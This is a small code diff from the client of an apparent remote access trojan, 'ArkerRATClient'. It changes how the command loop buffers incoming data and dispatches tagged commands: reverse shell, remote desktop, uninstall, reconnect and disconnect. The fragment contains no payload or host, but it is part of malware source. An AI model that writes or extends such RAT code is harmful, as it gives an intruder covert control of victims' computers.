@@ -180,18 +180,19 @@ namespace ArkerRATClient
 
                             lock (GlobalVariables._lock)
                             {
-                                data = stringBuilder.ToString();
+                                data += stringBuilder.ToString();
                             }
 
-                           SortData("§DisconnectStart§", "§DisconnectEnd§");
-                            SortData("§UninstallStart§", "§UninstallEnd§");
-                           SortData("§ReverseShellStart§", "§ReverseShellEnd§");
-                           SortData("§PingStart§", "§PingEnd§");
-                            SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§");
-                           SortData("§ReconnectStart§", "§ReconnectEnd§");
+                        await Task.Run(() => SortData("§DisconnectStart§", "§DisconnectEnd§"));
+                        await Task.Run(() => SortData("§UninstallStart§", "§UninstallEnd§"));
+                        await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
+                        await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
+                        await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));
+                        await Task.Run(() => SortData("§ReconnectStart§", "§ReconnectEnd§"));
 
 
-                            stringBuilder.Clear();
+
+                        stringBuilder.Clear();
                         }
 
                         await Task.Delay(1);
